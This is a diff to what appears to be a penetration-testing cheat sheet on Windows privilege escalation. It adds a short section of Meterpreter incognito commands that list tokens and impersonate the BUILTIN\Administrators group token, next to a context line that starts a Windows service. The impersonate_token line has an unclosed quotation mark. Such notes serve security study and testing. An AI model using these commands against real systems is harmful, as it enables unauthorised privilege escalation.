@@ -457,7 +457,15 @@ start service
 sc start AdvancedSystemCareService9
 ```
 
+## impersonate windows tokens
 
+in meterpreter 
+
+```
+load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators
+```
 
 
 ## CheckList
